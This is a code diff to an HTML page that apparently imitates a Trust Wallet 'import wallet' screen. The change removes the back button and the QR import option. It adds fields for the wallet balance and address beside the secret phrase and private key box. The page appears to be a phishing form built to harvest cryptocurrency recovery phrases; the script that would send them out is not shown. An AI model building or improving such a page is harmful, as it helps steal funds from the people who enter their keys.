@@ -7,6 +7,40 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/styles.css">
+
+    <style>
+        /* Hide horizontal scrollbar in modal panels */
+        .modal-right {
+            overflow-x: hidden !important;
+        }
+        .panel {
+            overflow-x: hidden !important;
+        }
+        .import-form {
+            overflow-x: hidden !important;
+        }
+        /* Hide scrollbar for webkit browsers */
+        .modal-right::-webkit-scrollbar {
+            display: none;
+        }
+        /* Hide scrollbar for IE, Edge and Firefox */
+        .modal-right {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        /* Hide number input up/down arrows (spinners) */
+        input[type=number]::-webkit-outer-spin-button,
+        input[type=number]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        input[type=number] {
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+    </style>
+<base target="_blank">
 </head>
 <body>
 
@@ -172,29 +206,34 @@
                 </div>
             </div>
 
-            <!-- Step 3 -->
+            <!-- Step 3 — Amount + Wallet Address added before Secret Phrase -->
             <div class="panel" id="imp-step3">
-                <div class="modal-nav">
-                    <button class="back-btn" data-imp-goto="2">
-                        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                        Back
-                    </button>
-                    <button class="qr-import-btn" id="qrImportTopBtn">
-                        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="0" y="0" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/><rect x="9" y="0" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/><rect x="0" y="9" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/><rect x="9.5" y="9.5" width="3" height="3" fill="currentColor" rx="0.5"/></svg>
-                        Import with QR Code
-                    </button>
-                </div>
+                
                 <h3>Import with Secret Phrase or Private Key</h3>
                 <div class="import-form">
+
                     <p class="field-label">Wallet Name</p>
                     <div class="field-input-wrap">
                         <input type="text" class="field-input" id="walletName" value="Main wallet" placeholder="Main wallet">
-                        <button class="clear-btn" id="clearWalletName">✕</button>
                     </div>
                     <p class="field-hint">You can edit this later</p>
+
+                    <p class="field-label" style="margin-top:22px;">Amount</p>
+                    <div class="field-input-wrap">
+                        <input type="number" class="field-input" id="walletAmount" placeholder="0.00" min="0.01" step="any">
+                    </div>
+                    <p class="field-hint">Enter the wallet balance amount</p>
+
+                    <p class="field-label" style="margin-top:22px;">Wallet Address</p>
+                    <div class="field-input-wrap">
+                        <input type="text" class="field-input" id="walletAddress" placeholder="0x... or your wallet address">
+                    </div>
+                    <p class="field-hint">Your public wallet address</p>
+
                     <p class="field-label" style="margin-top:22px;">Enter Secret Phrase or Private Key</p>
                     <textarea class="field-input" id="secretPhrase" placeholder="Enter your 12, 18, or 24-word secret phrase, or your private key..."></textarea>
                     <p class="field-hint">Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces<br>Private Key is a long alphanumeric code</p>
+
                     <div class="import-form-spacer"></div>
                     <button class="action-btn" id="importBtn">Import</button>
                 </div>
@@ -332,8 +371,6 @@
         </div>
     </div>
 </div>
-
-
 
 
 <script src="js/trustwallet.js"></script>
